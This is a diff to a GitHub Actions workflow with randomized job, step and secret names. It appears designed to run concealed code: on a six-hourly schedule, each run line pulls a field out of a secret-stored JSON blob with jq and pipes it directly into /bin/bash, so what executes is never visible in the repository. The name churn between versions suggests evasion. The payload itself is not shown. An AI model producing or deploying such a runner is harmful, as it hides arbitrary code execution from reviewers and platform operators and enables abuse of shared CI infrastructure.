@@ -1,25 +1,25 @@
 name: yaowenyuan4198
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 0/6 * * *'
-jobs:  # 7293
+    - cron: '51 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yaowenyuan4198
         env:
-          k97231: ${{ secrets.k97231 }}
+          c70: ${{ secrets.c70 }}
         run: |
-          echo $k97231 | jq -r .gb0687 | /bin/bash
-          echo $zu61074 | jq -r .ktsok654 | /bin/bash
-          echo $d6 | jq -r .cxg624 | /bin/bash
-          echo $cnt698 | jq -r .w9 | /bin/bash
-          echo $dpu37 | jq -r .rv6 | /bin/bash
-          echo $sgv0768 | jq -r .ff088 | /bin/bash
-          echo $lssji44 | jq -r .sh98834 | /bin/bash
-          echo $wxe54 | jq -r .q262 | /bin/bash
-          echo $vm26 | jq -r .knbuq84 | /bin/bash
-          echo $nxr33080 | jq -r .zqvmi0785 | /bin/bash
+          echo $c70 | jq -r .py2502 | /bin/bash
+          echo $lim2 | jq -r .j4 | /bin/bash
+          echo $iykgd664 | jq -r .fqw69 | /bin/bash
+          echo $p06619 | jq -r .dmfjr92 | /bin/bash
+          echo $gv72 | jq -r .nm58589 | /bin/bash
+          echo $kdgh26114 | jq -r .jk9952 | /bin/bash
+          echo $kg794 | jq -r .i8 | /bin/bash
 
